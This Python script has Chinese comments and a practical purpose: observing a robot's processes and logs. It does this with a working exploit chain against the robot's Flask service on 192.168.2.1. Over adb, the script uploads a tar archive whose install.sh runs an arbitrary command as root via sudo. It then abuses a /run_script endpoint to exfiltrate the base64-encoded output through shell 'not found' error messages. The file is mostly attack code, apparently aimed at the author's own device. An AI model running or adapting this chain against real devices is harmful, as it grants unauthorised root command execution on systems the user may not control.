#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""观察机器人进程/日志（经 Flask /upload 提权执行 + /run_script base64 回读）
用法: python observe.py "<命令>"   例: python observe.py "ps -eo pid,etime,comm | grep monitor"
"""
import base64
import io
import json
import os
import re
import subprocess
import sys
import tarfile
import tempfile
import time

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

ADB = "adb"
ROBOT = "192.168.2.1"
PORT = 5000


def sh(args, timeout=30):
    p = subprocess.run(args, capture_output=True, timeout=timeout)
    out = p.stdout.decode("utf-8", "replace") if isinstance(p.stdout, bytes) else p.stdout
    err = p.stderr.decode("utf-8", "replace") if isinstance(p.stderr, bytes) else p.stderr
    return out + err


def get_device():
    out = sh([ADB, "devices"], 10)
    for line in out.split("\n")[1:]:
        if "\tdevice" in line:
            return line.split("\t")[0]
    return None


def build_tar(script_content):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        payload = ("#!/bin/sh\n" + script_content + "\n").encode()
        info = tarfile.TarInfo(name="install.sh")
        info.size = len(payload)
        info.mode = 0o755
        tar.addfile(info, io.BytesIO(payload))
    return buf.getvalue()


def upload(device, tar_bytes):
    fd, local = tempfile.mkstemp(suffix=".tar.gz")
    with open(local, "wb") as f:
        f.write(tar_bytes)
    os.close(fd)
    remote = "/data/local/tmp/exploit.tar.gz"
    subprocess.run([ADB, "-s", device, "push", local, remote], capture_output=True, timeout=30)
    os.remove(local)
    curl = "curl -s -X POST http://%s:%d/upload -F 'file=@%s'" % (ROBOT, PORT, remote)
    return sh([ADB, "-s", device, "shell", curl], 30)


def run_root(device, cmd, sleep=1.6):
    out = "/tmp/exploit_out.txt"
    script = "sudo sh -c '%s | base64 > %s 2>&1'" % (cmd, out)
    upload(device, build_tar(script))
    time.sleep(sleep)
    body = json.dumps({"script": out, "args": ""})
    curl = ("curl -s -X POST http://%s:%d/run_script "
            "-H 'Content-Type: application/json' -d '%s'" % (ROBOT, PORT, body))
    resp = sh([ADB, "-s", device, "shell", curl], 30)
    try:
        data = json.loads(resp)
    except Exception:
        return "[响应解析失败] " + resp[:200]
    stderr = data.get("stderr", "")
    b64 = ""
    for line in stderr.split("\n"):
        m = re.match(r"^[^:]+: \d+: ([A-Za-z0-9+/=]+): not found$", line)
        if m:
            b64 += m.group(1)
    try:
        return base64.b64decode(b64).decode("utf-8", "ignore")
    except Exception:
        return b64 or ("[无输出] stderr片段: " + stderr[:150])


def main():
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
    device = get_device()
    if not device:
        sys.exit("[-] 未找到 adb 设备")
    print("[*] 执行: %s" % cmd)
    print("-" * 60)
    print(run_root(device, cmd))
    print("-" * 60)


if __name__ == "__main__":
    main()
